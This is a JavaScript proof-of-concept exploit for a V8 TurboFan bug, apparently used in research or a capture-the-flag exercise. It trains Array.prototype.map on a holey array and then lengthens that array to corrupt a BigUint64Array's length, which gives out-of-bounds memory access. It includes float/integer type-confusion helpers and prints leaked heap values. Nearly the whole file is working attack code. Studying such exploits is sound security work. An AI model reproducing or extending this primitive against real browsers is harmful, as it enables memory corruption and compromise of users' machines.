function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); }};

let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
let bigint = new BigUint64Array(f64.buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
function d2u(v) {
  f64[0] = v;
  return u32;
}
function u2d(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}
function f2i(v) {
  f64[0] = v;
  return bigint[0];
}
function i2f(i) {
  bigint[0] = i;
  return f64[0];
}

const SIZE = 32 * 1024 * 1024;
// This call ensures that TurboFan won't inline array constructors.
Array(2**30);
// Set up a fast holey smi array, and generate optimized code.
let arr = [0.1, 0.2, ,,, 3];
let numiter = 12;
if (x64) {
  numiter = 24;
}

// global
let targetArray = null; 
let leakarray = null;
let targetBuffer = null;

function func(v,idx) {
  if (idx > numiter) {
    throw "err";
  } else if (idx == 0) {
    targetArray = new BigUint64Array(2);
  }
  return v;
}
function mapping(a) {
  return a.map(func);
}
for(let i = 0; i < 100000; i++){
  mapping(arr);
}
// Now lengthen the array, but ensure that it points to a non-dictionary
// backing store.
arr.length = SIZE-1;
arr.fill(1, numiter);
arr.length += 2;
// Now, the non-inlined array constructor should produce an array with
// dictionary elements: causing a crash.
try{
  gc();
  mapping(arr);
} catch {};

leakarray = [0x4141,0x4242,{}];

if (targetArray.length == 0x1ff80000 || targetArray.length == 0x3ff00000) {
  print("success");
} else {
  print("fail");
}

//%DebugPrint(arr);
//%DebugPrint(targetArray);
//%DebugPrint(leakarray);
print("targetArray.length " + targetArray.length);
print("targetArray.hex    " + targetArray.length.toString(16));
for (let i = 0; i < 0x20; i++) {
print("targetArray[" + i + "] " + targetArray[i]);
print("targetArray[" + i + "] " + targetArray[i].toString(16));
}
throw "win";

